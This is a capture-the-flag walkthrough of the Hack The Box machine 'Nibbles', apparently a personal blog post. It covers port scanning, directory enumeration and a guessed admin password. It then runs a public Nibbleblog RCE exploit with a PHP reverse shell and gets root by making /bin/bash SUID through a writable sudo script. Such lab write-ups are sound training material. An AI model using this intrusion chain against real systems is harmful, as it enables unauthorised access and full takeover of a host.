---
title: "HTB Nibbles"
date: 2022-12-18T18:22:03-05:00
draft: false
---

#### Initial nmap
```bash
sudo nmap -p- -T5 $IP

Nmap scan report for 10.129.30.217
Host is up (0.041s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

#### Concentrated nmap

```bash
sudo nmap -p 22,80 -A -T5 $IP

Nmap scan report for 10.129.30.217
Host is up (0.042s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4f8ade8f80477decf150d630a187e49 (RSA)
|   256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA)
|_  256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.2 - 4.9 (95%), Linux 3.8 - 3.11 (95%), Linux 4.8 (95%), Linux 4.4 (95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 4.2 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   42.51 ms 10.10.14.1
2   42.63 ms 10.129.30.217
```

#### Port 80 - 

It looks like a static webpage
![[Pasted image 20221218153404.png]]

Since there are only two ports open I will run gobuster and see if I can find any directories that may be on the site.

![[Pasted image 20221218154839.png]]

No luck with directory brute-forcing, but if I check the source of the webpage we get a bit of a hint.

![[Pasted image 20221218161817.png]]

If i navigate to the webpage `http://$IP/nibbleblog/` it looks like a blog page.

![[Pasted image 20221218161936.png]]

Using gobuster we can look for subdirectories inside /nibbleblog/ 

![[Pasted image 20221218162145.png]]

Navigating to the readme file at `http://$IP/nibbleblog/README`

we can see the version the blog is running

![[Pasted image 20221218162251.png]]
After doing some research on google, I found there is a RCE on this version of nibbleblog, but we need to be authenticated. 

I will try default credentials i.e. `admin:admin` etc.

after doing this for a bit I tried `admin:nibbles` and it was successful! Now we can move forward with the RCE.

#### RCE - 

I will be using this script from github (https://github.com/dix0nym/CVE-2015-6967) combined with the php reverse shell which can be found here (https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)

when you setup the php reverse shell be sure to edit the file and add your IP & port that you will be listening on.
![[Pasted image 20221218163807.png]]

Once finished you can proceed with these steps

```bash
git clone https://github.com/dix0nym/CVE-2015-6967.git
```

```bash
chmod +x exploit.py
```

```bash
python3 exploit.py --url http://10.129.30.217/nibbleblog/ --username admin --password nibbles --payload shell.php
```

After running the script check your reverse shell and you should see the following - 

![[Pasted image 20221218164105.png]]

Upgrading our shell (make the reverse shell more stable)

```bash
which python3

/usr/bin/python3
```

Great, we can use python3 to upgrade our shell

```python
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

after running you should see this - 
![[Pasted image 20221218164331.png]]

Now we can make it even better with the following - 

```
ctrl+z (this will drop you into your host/vm terminal)
```

When in your host shell 

```bash
stty raw -echo ; fg (Hit enter, nothing will happen, but hit enter again and you will be back into the shell as nibbler@Nibbles)
```

![[Pasted image 20221218164640.png]]

Next we can export TERM 

```bash 
export TERM=xterm-256color
```

#### PrivEsc

As the user nibbler we can run a script using sudo 

![[Pasted image 20221218165025.png]]

the files are zipped up but we can fix that.

```bash
unzip personal.zip
```

```bash
cd personal/stuff
```

```bash
ls -la 

drwxr-xr-x 2 nibbler nibbler 4096 Dec 10  2017 .
drwxr-xr-x 3 nibbler nibbler 4096 Dec 10  2017 ..
-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 monitor.sh
```

We can write to this file, so lets add something we can abuse to gain root access!

```bash
echo "chmod +s /bin/bash" >> monitor.sh
```

execute the script as sudo 

```bash
sudo /home/nibbler/personal/stuff/monitor.sh
```

this should set the bash binary to has a SUID bit set this will allow us to execute bash as root. We can do this with the following command.

```bash
bash -p
```

After running that you should see this - 

![[Pasted image 20221218165704.png]]

and if you run whoami it will say `root`

you can gather the flags from the user & root directory.


